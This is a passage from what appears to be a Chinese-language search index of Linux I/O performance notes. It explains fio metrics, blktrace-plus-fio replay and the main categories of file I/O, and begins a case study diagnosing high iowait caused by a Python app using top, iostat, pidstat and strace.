slat\u3001clat\u3001lat \uff0c\u4ee5\u53ca bw \u548c iops \u8fd9\u51e0\u884c\u3002 \u5148\u6765\u770b\u521a\u521a\u63d0\u5230\u7684\u524d\u4e09\u4e2a\u53c2\u6570\u3002\u4e8b\u5b9e\u4e0a\uff0cslat\u3001clat\u3001lat \u90fd\u662f\u6307 I/O \u5ef6\u8fdf\uff08latency\uff09\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff1a slat \uff0c\u662f\u6307\u4ece I/O \u63d0\u4ea4\u5230\u5b9e\u9645\u6267\u884c I/O \u7684\u65f6\u957f\uff08Submission latency\uff09\uff1b clat \uff0c\u662f\u6307\u4ece I/O \u63d0\u4ea4\u5230 I/O \u5b8c\u6210\u7684\u65f6\u957f\uff08Completion latency\uff09\uff1b lat \uff0c\u6307\u7684\u662f\u4ece fio \u521b\u5efa I/O \u5230 I/O \u5b8c\u6210\u7684\u603b\u65f6\u957f\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bf9\u540c\u6b65 I/O \u6765\u8bf4\uff0c\u7531\u4e8e I/O \u63d0\u4ea4\u548c I/O \u5b8c\u6210\u662f\u4e00\u4e2a\u52a8\u4f5c\uff0c\u6240\u4ee5 slat \u5b9e\u9645\u4e0a\u5c31\u662f I/O \u5b8c\u6210\u7684\u65f6\u95f4\uff0c\u800c clat \u662f 0\u3002\u800c\u4ece\u793a\u4f8b\u53ef\u4ee5\u770b\u5230\uff0c\u4f7f\u7528\u5f02\u6b65 I/O\uff08libaio\uff09\u65f6\uff0clat \u8fd1\u4f3c\u7b49\u4e8e slat + clat \u4e4b\u548c\u3002 bw \uff0c\u5b83\u4ee3\u8868\u541e\u5410\u91cf\u3002\u5728\u6211\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\uff0c\u5e73\u5747\u541e\u5410\u91cf\u5927\u7ea6\u662f 16 MB\uff0817005 KiB/1024\uff09\u3002 iops \uff0c\u5176\u5b9e\u5c31\u662f\u6bcf\u79d2 I/O \u7684\u6b21\u6570\uff0c\u4e0a\u9762\u793a\u4f8b\u4e2d\u7684\u5e73\u5747 IOPS \u4e3a 4250\u3002 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684 I/O \u90fd\u662f\u8bfb\u5199\u5e76\u884c\u7684\uff0c\u800c\u4e14\u6bcf\u6b21\u7684 I/O \u5927\u5c0f\u4e5f\u4e0d\u4e00\u5b9a\u76f8\u540c\u3002\u6240\u4ee5\uff0c\u521a\u521a\u8bf4\u7684\u8fd9\u51e0\u79cd\u573a\u666f\uff0c\u5e76\u4e0d\u80fd\u7cbe\u786e\u6a21\u62df\u5e94\u7528\u7a0b\u5e8f\u7684 I/O \u6a21\u5f0f\u3002\u90a3\u600e\u4e48\u624d\u80fd\u7cbe\u786e\u6a21\u62df\u5e94\u7528\u7a0b\u5e8f\u7684 I/O \u6a21\u5f0f\u5462\uff1f \u5e78\u8fd0\u7684\u662f\uff0cfio \u652f\u6301 I/O \u7684\u91cd\u653e\u3002\u501f\u52a9\u524d\u9762\u63d0\u5230\u8fc7\u7684 blktrace\uff0c\u518d\u914d\u5408\u4e0a fio\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u5e94\u7528\u7a0b\u5e8f I/O \u6a21\u5f0f\u7684\u57fa\u51c6\u6d4b\u8bd5\u3002\u4f60\u9700\u8981\u5148\u7528 blktrace \uff0c\u8bb0\u5f55\u78c1\u76d8\u8bbe\u5907\u7684 I/O \u8bbf\u95ee\u60c5\u51b5\uff1b\u7136\u540e\u4f7f\u7528 fio \uff0c\u91cd\u653e blktrace \u7684\u8bb0\u5f55\u3002 # \u4f7f\u7528blktrace\u8ddf\u8e2a\u78c1\u76d8I/O\uff0c\u6ce8\u610f\u6307\u5b9a\u5e94\u7528\u7a0b\u5e8f\u6b63\u5728\u64cd\u4f5c\u7684\u78c1\u76d8 $ blktrace /dev/sdb # \u67e5\u770bblktrace\u8bb0\u5f55\u7684\u7ed3\u679c # ls sdb.blktrace.0 sdb.blktrace.1 # \u5c06\u7ed3\u679c\u8f6c\u5316\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6 $ blkparse sdb -d sdb.bin # \u4f7f\u7528fio\u91cd\u653e\u65e5\u5fd7 $ fio --name=replay --filename=/dev/sdb --direct=1 --read_iolog=sdb.bin \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u901a\u8fc7 blktrace+fio \u7684\u7ec4\u5408\u4f7f\u7528\uff0c\u5f97\u5230\u4e86\u5e94\u7528\u7a0b\u5e8f I/O \u6a21\u5f0f\u7684\u57fa\u51c6\u6d4b\u8bd5\u62a5\u544a\u3002","title":"fio"},{"location":"system/linux/IO/IO%E7%9A%84%E7%B1%BB%E5%9E%8B/","text":"IO\u7684\u7c7b\u578b \u6587\u4ef6\u8bfb\u5199\u65b9\u5f0f\u7684\u5404\u79cd\u5dee\u5f02\uff0c\u5bfc\u81f4 I/O \u7684\u5206\u7c7b\u591a\u79cd\u591a\u6837\u3002\u6700\u5e38\u89c1\u7684\u6709\uff0c \u7f13\u51b2\u4e0e\u975e\u7f13\u51b2 I/O \u76f4\u63a5\u4e0e\u975e\u76f4\u63a5 I/O \u963b\u585e\u4e0e\u975e\u963b\u585e I/O \u540c\u6b65\u4e0e\u5f02\u6b65 I/O \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c31\u8be6\u7ec6\u770b\u8fd9\u56db\u79cd\u5206\u7c7b\u3002 \u7b2c\u4e00\u79cd \u6839\u636e\u662f\u5426\u5229\u7528\u6807\u51c6\u5e93\u7f13\u5b58\uff0c\u53ef\u4ee5\u628a\u6587\u4ef6 I/O \u5206\u4e3a\u7f13\u51b2 I/O \u4e0e\u975e\u7f13\u51b2 I/O\u3002 \u7f13\u51b2 I/O\uff0c\u662f\u6307\u5229\u7528\u6807\u51c6\u5e93\u7f13\u5b58\u6765\u52a0\u901f\u6587\u4ef6\u7684\u8bbf\u95ee\uff0c\u800c\u6807\u51c6\u5e93\u5185\u90e8\u518d\u901a\u8fc7\u7cfb\u7edf\u8c03\u5ea6\u8bbf\u95ee\u6587\u4ef6\u3002 \u975e\u7f13\u51b2 I/O\uff0c\u662f\u6307\u76f4\u63a5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u8bbf\u95ee\u6587\u4ef6\uff0c\u4e0d\u518d\u7ecf\u8fc7\u6807\u51c6\u5e93\u7f13\u5b58\u3002 \u6ce8\u610f\uff0c\u8fd9\u91cc\u6240\u8bf4\u7684\u201c\u7f13\u51b2\u201d\uff0c\u662f\u6307\u6807\u51c6\u5e93\u5185\u90e8\u5b9e\u73b0\u7684\u7f13\u5b58\u3002\u6bd4\u65b9\u8bf4\uff0c\u4f60\u53ef\u80fd\u89c1\u5230\u8fc7\uff0c\u5f88\u591a\u7a0b\u5e8f\u9047\u5230\u6362\u884c\u65f6\u624d\u771f\u6b63\u8f93\u51fa\uff0c\u800c\u6362\u884c\u524d\u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u5c31\u662f\u88ab\u6807\u51c6\u5e93\u6682\u65f6\u7f13\u5b58\u4e86\u8d77\u6765\u3002 \u65e0\u8bba\u7f13\u51b2 I/O \u8fd8\u662f\u975e\u7f13\u51b2 I/O\uff0c\u5b83\u4eec\u6700\u7ec8\u8fd8\u662f\u8981\u7ecf\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u8bbf\u95ee\u6587\u4ef6\u3002\u800c\u6839\u636e\u4e0a\u4e00\u8282\u5185\u5bb9\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u7cfb\u7edf\u8c03\u7528\u540e\uff0c\u8fd8\u4f1a\u901a\u8fc7\u9875\u7f13\u5b58\uff0c\u6765\u51cf\u5c11\u78c1\u76d8\u7684 I/O \u64cd\u4f5c\u3002 \u7b2c\u4e8c\u79cd \u6839\u636e\u662f\u5426\u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u9875\u7f13\u5b58\uff0c\u53ef\u4ee5\u628a\u6587\u4ef6 I/O \u5206\u4e3a\u76f4\u63a5 I/O \u4e0e\u975e\u76f4\u63a5 I/O\u3002 \u76f4\u63a5 I/O\uff0c\u662f\u6307\u8df3\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u7684\u9875\u7f13\u5b58\uff0c\u76f4\u63a5\u8ddf\u6587\u4ef6\u7cfb\u7edf\u4ea4\u4e92\u6765\u8bbf\u95ee\u6587\u4ef6\u3002 \u975e\u76f4\u63a5 I/O \u6b63\u597d\u76f8\u53cd\uff0c\u6587\u4ef6\u8bfb\u5199\u65f6\uff0c\u5148\u8981\u7ecf\u8fc7\u7cfb\u7edf\u7684\u9875\u7f13\u5b58\uff0c\u7136\u540e\u518d\u7531\u5185\u6838\u6216\u989d\u5916\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u771f\u6b63\u5199\u5165\u78c1\u76d8\u3002 \u60f3\u8981\u5b9e\u73b0\u76f4\u63a5 I/O\uff0c\u9700\u8981\u4f60\u5728\u7cfb\u7edf\u8c03\u7528\u4e2d\uff0c\u6307\u5b9a O_DIRECT \u6807\u5fd7\u3002\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u8fc7\uff0c\u9ed8\u8ba4\u7684\u662f\u975e\u76f4\u63a5 I/O\u3002 \u4e0d\u8fc7\u8981\u6ce8\u610f\uff0c\u76f4\u63a5 I/O\u3001\u975e\u76f4\u63a5 I/O\uff0c\u672c\u8d28\u4e0a\u8fd8\u662f\u548c\u6587\u4ef6\u7cfb\u7edf\u4ea4\u4e92\u3002\u5982\u679c\u662f\u5728\u6570\u636e\u5e93\u7b49\u573a\u666f\u4e2d\uff0c\u4f60\u8fd8\u4f1a\u770b\u5230\uff0c\u8df3\u8fc7\u6587\u4ef6\u7cfb\u7edf\u8bfb\u5199\u78c1\u76d8\u7684\u60c5\u51b5\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u901a\u5e38\u6240\u8bf4\u7684\u88f8 I/O\u3002 \u7b2c\u4e09\u79cd \u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u963b\u585e\u81ea\u8eab\u8fd0\u884c\uff0c\u53ef\u4ee5\u628a\u6587\u4ef6 I/O \u5206\u4e3a\u963b\u585e I/O \u548c\u975e\u963b\u585e I/O\uff1a \u6240\u8c13\u963b\u585e I/O\uff0c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u6267\u884c I/O \u64cd\u4f5c\u540e\uff0c\u5982\u679c\u6ca1\u6709\u83b7\u5f97\u54cd\u5e94\uff0c\u5c31\u4f1a\u963b\u585e\u5f53\u524d\u7ebf\u7a0b\uff0c\u81ea\u7136\u5c31\u4e0d\u80fd\u6267\u884c\u5176\u4ed6\u4efb\u52a1\u3002 \u6240\u8c13\u975e\u963b\u585e I/O\uff0c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u6267\u884c I/O \u64cd\u4f5c\u540e\uff0c\u4e0d\u4f1a\u963b\u585e\u5f53\u524d\u7684\u7ebf\u7a0b\uff0c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u5176\u4ed6\u7684\u4efb\u52a1\uff0c\u968f\u540e\u518d\u901a\u8fc7\u8f6e\u8be2\u6216\u8005\u4e8b\u4ef6\u901a\u77e5\u7684\u5f62\u5f0f\uff0c\u83b7\u53d6\u8c03\u7528\u7684\u7ed3\u679c\u3002 \u6bd4\u65b9\u8bf4\uff0c\u8bbf\u95ee\u7ba1\u9053\u6216\u8005\u7f51\u7edc\u5957\u63a5\u5b57\u65f6\uff0c\u8bbe\u7f6e O_NONBLOCK \u6807\u5fd7\uff0c\u5c31\u8868\u793a\u7528\u975e\u963b\u585e\u65b9\u5f0f\u8bbf\u95ee\uff1b\u800c\u5982\u679c\u4e0d\u505a\u4efb\u4f55\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u7684\u5c31\u662f\u963b\u585e\u8bbf\u95ee\u3002 \u7b2c\u56db\u79cd \u6839\u636e\u662f\u5426\u7b49\u5f85\u54cd\u5e94\u7ed3\u679c\uff0c\u53ef\u4ee5\u628a\u6587\u4ef6 I/O \u5206\u4e3a\u540c\u6b65\u548c\u5f02\u6b65 I/O\uff1a \u6240\u8c13\u540c\u6b65 I/O\uff0c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u6267\u884c I/O \u64cd\u4f5c\u540e\uff0c\u8981\u4e00\u76f4\u7b49\u5230\u6574\u4e2a I/O \u5b8c\u6210\u540e\uff0c\u624d\u80fd\u83b7\u5f97 I/O \u54cd\u5e94\u3002 \u6240\u8c13\u5f02\u6b65 I/O\uff0c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u6267\u884c I/O \u64cd\u4f5c\u540e\uff0c\u4e0d\u7528\u7b49\u5f85\u5b8c\u6210\u548c\u5b8c\u6210\u540e\u7684\u54cd\u5e94\uff0c\u800c\u662f\u7ee7\u7eed\u6267\u884c\u5c31\u53ef\u4ee5\u3002\u7b49\u5230\u8fd9\u6b21 I/O \u5b8c\u6210\u540e\uff0c\u54cd\u5e94\u4f1a\u7528\u4e8b\u4ef6\u901a\u77e5\u7684\u65b9\u5f0f\uff0c\u544a\u8bc9\u5e94\u7528\u7a0b\u5e8f\u3002","title":"IO\u7684\u7c7b\u578b"},{"location":"system/linux/IO/IO%E7%9A%84%E7%B1%BB%E5%9E%8B/#io","text":"\u6587\u4ef6\u8bfb\u5199\u65b9\u5f0f\u7684\u5404\u79cd\u5dee\u5f02\uff0c\u5bfc\u81f4 I/O \u7684\u5206\u7c7b\u591a\u79cd\u591a\u6837\u3002\u6700\u5e38\u89c1\u7684\u6709\uff0c \u7f13\u51b2\u4e0e\u975e\u7f13\u51b2 I/O \u76f4\u63a5\u4e0e\u975e\u76f4\u63a5 I/O \u963b\u585e\u4e0e\u975e\u963b\u585e I/O \u540c\u6b65\u4e0e\u5f02\u6b65 I/O \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c31\u8be6\u7ec6\u770b\u8fd9\u56db\u79cd\u5206\u7c7b\u3002","title":"IO\u7684\u7c7b\u578b"},{"location":"system/linux/IO/IO%E7%9A%84%E7%B1%BB%E5%9E%8B/#_1","text":"\u6839\u636e\u662f\u5426\u5229\u7528\u6807\u51c6\u5e93\u7f13\u5b58\uff0c\u53ef\u4ee5\u628a\u6587\u4ef6 I/O \u5206\u4e3a\u7f13\u51b2 I/O \u4e0e\u975e\u7f13\u51b2 I/O\u3002 \u7f13\u51b2 I/O\uff0c\u662f\u6307\u5229\u7528\u6807\u51c6\u5e93\u7f13\u5b58\u6765\u52a0\u901f\u6587\u4ef6\u7684\u8bbf\u95ee\uff0c\u800c\u6807\u51c6\u5e93\u5185\u90e8\u518d\u901a\u8fc7\u7cfb\u7edf\u8c03\u5ea6\u8bbf\u95ee\u6587\u4ef6\u3002 \u975e\u7f13\u51b2 I/O\uff0c\u662f\u6307\u76f4\u63a5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u8bbf\u95ee\u6587\u4ef6\uff0c\u4e0d\u518d\u7ecf\u8fc7\u6807\u51c6\u5e93\u7f13\u5b58\u3002 \u6ce8\u610f\uff0c\u8fd9\u91cc\u6240\u8bf4\u7684\u201c\u7f13\u51b2\u201d\uff0c\u662f\u6307\u6807\u51c6\u5e93\u5185\u90e8\u5b9e\u73b0\u7684\u7f13\u5b58\u3002\u6bd4\u65b9\u8bf4\uff0c\u4f60\u53ef\u80fd\u89c1\u5230\u8fc7\uff0c\u5f88\u591a\u7a0b\u5e8f\u9047\u5230\u6362\u884c\u65f6\u624d\u771f\u6b63\u8f93\u51fa\uff0c\u800c\u6362\u884c\u524d\u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u5c31\u662f\u88ab\u6807\u51c6\u5e93\u6682\u65f6\u7f13\u5b58\u4e86\u8d77\u6765\u3002 \u65e0\u8bba\u7f13\u51b2 I/O \u8fd8\u662f\u975e\u7f13\u51b2 I/O\uff0c\u5b83\u4eec\u6700\u7ec8\u8fd8\u662f\u8981\u7ecf\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u8bbf\u95ee\u6587\u4ef6\u3002\u800c\u6839\u636e\u4e0a\u4e00\u8282\u5185\u5bb9\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u7cfb\u7edf\u8c03\u7528\u540e\uff0c\u8fd8\u4f1a\u901a\u8fc7\u9875\u7f13\u5b58\uff0c\u6765\u51cf\u5c11\u78c1\u76d8\u7684 I/O \u64cd\u4f5c\u3002","title":"\u7b2c\u4e00\u79cd"},{"location":"system/linux/IO/IO%E7%9A%84%E7%B1%BB%E5%9E%8B/#_2","text":"\u6839\u636e\u662f\u5426\u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u9875\u7f13\u5b58\uff0c\u53ef\u4ee5\u628a\u6587\u4ef6 I/O \u5206\u4e3a\u76f4\u63a5 I/O \u4e0e\u975e\u76f4\u63a5 I/O\u3002 \u76f4\u63a5 I/O\uff0c\u662f\u6307\u8df3\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u7684\u9875\u7f13\u5b58\uff0c\u76f4\u63a5\u8ddf\u6587\u4ef6\u7cfb\u7edf\u4ea4\u4e92\u6765\u8bbf\u95ee\u6587\u4ef6\u3002 \u975e\u76f4\u63a5 I/O \u6b63\u597d\u76f8\u53cd\uff0c\u6587\u4ef6\u8bfb\u5199\u65f6\uff0c\u5148\u8981\u7ecf\u8fc7\u7cfb\u7edf\u7684\u9875\u7f13\u5b58\uff0c\u7136\u540e\u518d\u7531\u5185\u6838\u6216\u989d\u5916\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u771f\u6b63\u5199\u5165\u78c1\u76d8\u3002 \u60f3\u8981\u5b9e\u73b0\u76f4\u63a5 I/O\uff0c\u9700\u8981\u4f60\u5728\u7cfb\u7edf\u8c03\u7528\u4e2d\uff0c\u6307\u5b9a O_DIRECT \u6807\u5fd7\u3002\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u8fc7\uff0c\u9ed8\u8ba4\u7684\u662f\u975e\u76f4\u63a5 I/O\u3002 \u4e0d\u8fc7\u8981\u6ce8\u610f\uff0c\u76f4\u63a5 I/O\u3001\u975e\u76f4\u63a5 I/O\uff0c\u672c\u8d28\u4e0a\u8fd8\u662f\u548c\u6587\u4ef6\u7cfb\u7edf\u4ea4\u4e92\u3002\u5982\u679c\u662f\u5728\u6570\u636e\u5e93\u7b49\u573a\u666f\u4e2d\uff0c\u4f60\u8fd8\u4f1a\u770b\u5230\uff0c\u8df3\u8fc7\u6587\u4ef6\u7cfb\u7edf\u8bfb\u5199\u78c1\u76d8\u7684\u60c5\u51b5\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u901a\u5e38\u6240\u8bf4\u7684\u88f8 I/O\u3002","title":"\u7b2c\u4e8c\u79cd"},{"location":"system/linux/IO/IO%E7%9A%84%E7%B1%BB%E5%9E%8B/#_3","text":"\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u963b\u585e\u81ea\u8eab\u8fd0\u884c\uff0c\u53ef\u4ee5\u628a\u6587\u4ef6 I/O \u5206\u4e3a\u963b\u585e I/O \u548c\u975e\u963b\u585e I/O\uff1a \u6240\u8c13\u963b\u585e I/O\uff0c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u6267\u884c I/O \u64cd\u4f5c\u540e\uff0c\u5982\u679c\u6ca1\u6709\u83b7\u5f97\u54cd\u5e94\uff0c\u5c31\u4f1a\u963b\u585e\u5f53\u524d\u7ebf\u7a0b\uff0c\u81ea\u7136\u5c31\u4e0d\u80fd\u6267\u884c\u5176\u4ed6\u4efb\u52a1\u3002 \u6240\u8c13\u975e\u963b\u585e I/O\uff0c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u6267\u884c I/O \u64cd\u4f5c\u540e\uff0c\u4e0d\u4f1a\u963b\u585e\u5f53\u524d\u7684\u7ebf\u7a0b\uff0c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u5176\u4ed6\u7684\u4efb\u52a1\uff0c\u968f\u540e\u518d\u901a\u8fc7\u8f6e\u8be2\u6216\u8005\u4e8b\u4ef6\u901a\u77e5\u7684\u5f62\u5f0f\uff0c\u83b7\u53d6\u8c03\u7528\u7684\u7ed3\u679c\u3002 \u6bd4\u65b9\u8bf4\uff0c\u8bbf\u95ee\u7ba1\u9053\u6216\u8005\u7f51\u7edc\u5957\u63a5\u5b57\u65f6\uff0c\u8bbe\u7f6e O_NONBLOCK \u6807\u5fd7\uff0c\u5c31\u8868\u793a\u7528\u975e\u963b\u585e\u65b9\u5f0f\u8bbf\u95ee\uff1b\u800c\u5982\u679c\u4e0d\u505a\u4efb\u4f55\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u7684\u5c31\u662f\u963b\u585e\u8bbf\u95ee\u3002","title":"\u7b2c\u4e09\u79cd"},{"location":"system/linux/IO/IO%E7%9A%84%E7%B1%BB%E5%9E%8B/#_4","text":"\u6839\u636e\u662f\u5426\u7b49\u5f85\u54cd\u5e94\u7ed3\u679c\uff0c\u53ef\u4ee5\u628a\u6587\u4ef6 I/O \u5206\u4e3a\u540c\u6b65\u548c\u5f02\u6b65 I/O\uff1a \u6240\u8c13\u540c\u6b65 I/O\uff0c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u6267\u884c I/O \u64cd\u4f5c\u540e\uff0c\u8981\u4e00\u76f4\u7b49\u5230\u6574\u4e2a I/O \u5b8c\u6210\u540e\uff0c\u624d\u80fd\u83b7\u5f97 I/O \u54cd\u5e94\u3002 \u6240\u8c13\u5f02\u6b65 I/O\uff0c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u6267\u884c I/O \u64cd\u4f5c\u540e\uff0c\u4e0d\u7528\u7b49\u5f85\u5b8c\u6210\u548c\u5b8c\u6210\u540e\u7684\u54cd\u5e94\uff0c\u800c\u662f\u7ee7\u7eed\u6267\u884c\u5c31\u53ef\u4ee5\u3002\u7b49\u5230\u8fd9\u6b21 I/O \u5b8c\u6210\u540e\uff0c\u54cd\u5e94\u4f1a\u7528\u4e8b\u4ef6\u901a\u77e5\u7684\u65b9\u5f0f\uff0c\u544a\u8bc9\u5e94\u7528\u7a0b\u5e8f\u3002","title":"\u7b2c\u56db\u79cd"},{"location":"system/linux/IO/Python%E5%AF%BC%E8%87%B4IO%E6%85%A2%E6%A1%88%E4%BE%8B/","text":"\u6709\u4e2a\u673a\u5668\u5bf9web\u54cd\u5e94\u6162\uff0c\u7cfb\u7edf\u6267\u884c\u547d\u4ee4\u4e5f\u534a\u5929\u51fa\u7ed3\u679c\uff0c\u6240\u4ee5\u6392\u67e5\u4e0b $ top top - 14:27:02 up 10:30, 1 user, load average: 1.82, 1.26, 0.76 Tasks: 129 total, 1 running, 74 sleeping, 0 stopped, 0 zombie %Cpu0 : 3.5 us, 2.1 sy, 0.0 ni, 0.0 id, 94.4 wa, 0.0 hi, 0.0 si, 0.0 st %Cpu1 : 2.4 us, 0.7 sy, 0.0 ni, 70.4 id, 26.5 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 8169300 total, 3323248 free, 436748 used, 4409304 buff/cache KiB Swap: 0 total, 0 free, 0 used. 7412556 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 12280 root 20 0 103304 28824 7276 S 14.0 0.4 0:08.77 python 16 root 20 0 0 0 0 S 0.3 0.0 0:09.22 ksoftirqd/1 1549 root 20 0 236712 24480 9864 S 0.3 0.3 3:31.38 python3 \u89c2\u5bdf top \u7684\u8f93\u51fa\u53ef\u4ee5\u53d1\u73b0\uff0c\u4e24\u4e2a CPU \u7684 iowait \u90fd\u975e\u5e38\u9ad8\u3002\u7279\u522b\u662f CPU0\uff0c iowait \u5df2\u7ecf\u9ad8\u8fbe 94 %\uff0c\u800c\u5269\u4f59\u5185\u5b58\u8fd8\u6709 3GB\uff0c\u770b\u8d77\u6765\u4e5f\u662f\u5145\u8db3\u7684\u3002 \u518d\u5f80\u4e0b\u770b\uff0c\u8fdb\u7a0b\u90e8\u5206\u6709\u4e00\u4e2a python \u8fdb\u7a0b\u7684 CPU \u4f7f\u7528\u7387\u7a0d\u5fae\u6709\u70b9\u9ad8\uff0c\u8fbe\u5230\u4e86 14%\u3002\u867d\u7136 14% \u5e76\u4e0d\u80fd\u6210\u4e3a\u6027\u80fd\u74f6\u9888\uff0c\u4e0d\u8fc7\u6709\u70b9\u5acc\u7591\u2014\u2014\u53ef\u80fd\u8ddf iowait \u7684\u5347\u9ad8\u6709\u5173\u3002 $ ps aux | grep app.py root 12222 0.4 0.2 96064 23452 pts/0 Ss+ 14:37 0:00 python /app.py root 12280 13.9 0.3 102424 27904 pts/0 Sl+ 14:37 0:09 /usr/local/bin/python /app.py \u4ece ps \u7684\u8f93\u51fa\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a CPU \u4f7f\u7528\u7387\u8f83\u9ad8\u7684\u8fdb\u7a0b\uff0c\u3002\u4e0d\u8fc7\u5148\u522b\u7740\u6025\u5206\u6790 CPU \u95ee\u9898\uff0c\u6bd5\u7adf iowait \u5df2\u7ecf\u9ad8\u8fbe 94%\uff0c I/O \u95ee\u9898\u624d\u662f\u6211\u4eec\u9996\u8981\u89e3\u51b3\u7684\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u8fd0\u884c\u4e0b\u9762\u7684 iostat \u547d\u4ee4\uff0c\u5176\u4e2d: -d \u9009\u9879\u662f\u6307\u663e\u793a\u51fa I/O \u7684\u6027\u80fd\u6307\u6807\uff1b -x \u9009\u9879\u662f\u6307\u663e\u793a\u51fa\u6269\u5c55\u7edf\u8ba1\u4fe1\u606f\uff08\u5373\u663e\u793a\u6240\u6709 I/O \u6307\u6807\uff09\u3002 $ iostat -d -x 1 Device r/s w/s rkB/s wkB/s rrqm/s wrqm/s %rrqm %wrqm r_await w_await aqu-sz rareq-sz wareq-sz svctm %util loop0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 sda 0.00 71.00 0.00 32912.00 0.00 0.00 0.00 0.00 0.00 18118.31 241.89 0.00 463.55 13.86 98.40 \u5177\u4f53\u89c2\u5bdf iostat \u7684\u8f93\u51fa\u3002\u4f60\u53ef\u4ee5\u53d1\u73b0\uff0c\u78c1\u76d8 sda \u7684 I/O \u4f7f\u7528\u7387\u5df2\u7ecf\u8fbe\u5230 98% \uff0c\u63a5\u8fd1\u9971\u548c\u4e86\u3002\u800c\u4e14\uff0c\u5199\u8bf7\u6c42\u7684\u54cd\u5e94\u65f6\u95f4\u9ad8\u8fbe 18 \u79d2\uff0c\u6bcf\u79d2\u7684\u5199\u6570\u636e\u4e3a 32 MB\uff0c\u663e\u7136\u5199\u78c1\u76d8\u78b0\u5230\u4e86\u74f6\u9888\u3002 \u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u8fd0\u884c\u4e0b\u9762\u7684 pidstat \u547d\u4ee4\uff0c\u89c2\u5bdf\u8fdb\u7a0b\u7684 I/O \u60c5\u51b5\uff1a $ pidstat -d 1 14:39:14 UID PID kB_rd/s kB_wr/s kB_ccwr/s iodelay Command 14:39:15 0 12280 0.00 335716.00 0.00 0 python \u4ece pidstat \u7684\u8f93\u51fa\uff0c\u6211\u4eec\u518d\u6b21\u770b\u5230\u4e86 PID \u53f7\u4e3a 12280 \u7684\u7ed3\u679c\u3002\u8fd9\u8bf4\u660e\uff0c\u6b63\u662f\u6848\u4f8b\u5e94\u7528\u5f15\u53d1 I/O \u7684\u6027\u80fd\u74f6\u9888\u3002 \u5230\u5e95\u662f\u4e0d\u662f\u8fd9\u6837\u5462\uff1f\u6211\u4eec\u4e0d\u59a8\u6765\u8bd5\u8bd5\u3002\u8fd8\u662f\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u6267\u884c\u4e0b\u9762\u7684 strace \u547d\u4ee4\uff1a $ strace -p 12280 strace: Process 12280 attached select(0, NULL, NULL, NULL, {tv_sec=0, tv_usec=567708}) = 0 (Timeout) stat(\"/usr/local/lib/python3.7/importlib/_bootstrap.py\", {st_mode=S_IFREG|0644, st_size=39278, ...}) = 0 stat(\"/usr/local/lib/python3.7/importlib/_bootstrap.py\", {st_mode=S_IFREG|0644, st_size=39278, ...}) = 0 \u4ece strace \u4e2d\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u5927\u91cf\u7684 stat \u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u4e14\u5927\u90fd\u4e3a python \u7684\u6587\u4ef6\uff0c\u4f46\u662f\uff0c\u8bf7\u6ce8\u610f\uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709\u4efb\u4f55 write \u7cfb\u7edf\u8c03\u7528\u3002 \u7531\u4e8e strace \u7684\u8f93\u51fa\u6bd4\u8f83\u591a\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 grep \uff0c\u6765\u8fc7\u6ee4\u4e00\u4e0b write\uff0c\u6bd4\u5982\uff1a $ strace -p 12280 2>&1 | grep write \u9057\u61be\u7684\u662f\uff0c\u8fd9\u91cc\u4ecd\u7136\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\u3002 \u4ecb\u7ecd\u4e00\u4e2a\u65b0\u5de5\u5177\uff0c filetop\u3002\u5b83\u662f bcc 